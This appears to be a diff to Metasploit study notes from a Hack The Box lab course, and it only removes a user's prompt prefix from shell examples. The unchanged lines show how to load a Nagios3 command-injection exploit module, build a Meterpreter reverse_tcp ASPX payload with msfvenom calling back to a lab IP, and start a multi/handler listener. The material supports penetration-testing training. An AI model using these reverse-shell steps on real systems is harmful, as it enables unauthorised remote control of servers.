@@ -1703,8 +1703,8 @@ For example:
 ### MSF - Loading Additional Modules at Runtime
 
 ```shell-session
-Morrigar@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
-Morrigar@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
+$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+$ msfconsole -m /usr/share/metasploit-framework/modules/
 ```
 
 ### MSF - Loading Additional Modules
@@ -1751,7 +1751,7 @@ All necessary information about Metasploit Ruby coding can be found on the [Ruby
 #### Generating Payload
 
 ```shell-session
-Morrigar@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -1765,7 +1765,7 @@ Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it 
 #### MSF - Setting Up Multi/Handler
 
 ```shell-session
-Morrigar@htb[/htb]$ msfconsole -q 
+$ msfconsole -q 
 
 msf6 > use multi/handler
 msf6 exploit(multi/handler) > show options
